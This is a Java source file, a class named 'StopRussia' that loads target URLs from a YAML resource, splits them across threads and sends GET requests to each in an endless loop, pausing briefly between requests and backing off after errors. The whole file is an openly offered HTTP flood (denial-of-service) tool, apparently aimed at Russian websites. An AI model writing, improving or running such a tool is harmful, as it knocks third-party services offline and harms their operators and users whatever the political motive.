import com.fasterxml.jackson.databind.ObjectMapper;
import org.yaml.snakeyaml.Yaml;

import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

public class StopRussia {

    public static final String resourceFile = "resources.yaml";

    public static final HttpClient httpClient = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_1_1)
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    public static void main(String[] args) throws Exception {
        ObjectMapper objectMapper = new ObjectMapper();
        Map<String, Object> resources;
        try (InputStream resourceInputStream = Thread.currentThread().getContextClassLoader()
                .getResourceAsStream(resourceFile)) {
            resources = new Yaml().load(resourceInputStream);
        }
        System.out.println("File was read successfully");
        int availableProcessors = Runtime.getRuntime().availableProcessors();
        Settings settings = objectMapper.convertValue(resources, Settings.class);
        int linksPerProcessor = settings.getLinks().size() / availableProcessors;
        List<List<String>> perProcessor = new ArrayList<>();
        int start = 0;
        for (int i = 1; i <= availableProcessors; i++) {
            int end = linksPerProcessor * i;
            if (i == availableProcessors && (settings.getLinks().size() % availableProcessors > 0)) {
                end++;
            }
            List<String> links = settings.getLinks().subList(start, end);
            perProcessor.add(links);
            start+=linksPerProcessor;
        }

        List<Runnable> tasks = new ArrayList<>();
        Map<String, AtomicLong> counterMap = new HashMap<>();
        for (List<String> links : perProcessor) {
            Runnable task = () -> {
                Map<String, LocalDateTime> waitList = new HashMap<>();
                links.forEach(link -> waitList.put(link, LocalDateTime.now()));
                while (true) {
                    for (String link : links) {
                        if (waitList.get(link).isBefore(LocalDateTime.now())) {
                            try {
                                HttpRequest request = HttpRequest.newBuilder().GET().uri(new URI(link)).build();
                                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                                if (counterMap.containsKey(link)) {
                                    AtomicLong counter = counterMap.get(link);
                                    counterMap.put(link, new AtomicLong(counter.incrementAndGet()));
                                    if (counter.get() % 100 == 0) {
                                        System.out.println(
                                                "100 requests has been sent to " + link + ", total: " + counter);
                                    }
                                } else {
                                    counterMap.put(link, new AtomicLong(1));
                                }
                                Thread.sleep(45);
                            } catch (Exception e) {
                                System.out.println(
                                        "Error " + e + ", link: " + link + ", thread will be sleeping for 1 min");
                                waitList.put(link, LocalDateTime.now().plusMinutes(1));
                            }
                        }
                    }
                }
            };
            tasks.add(task);
        }
        ExecutorService service = Executors.newFixedThreadPool(settings.getLinks().size());
        tasks.forEach(service::submit);
    }
}
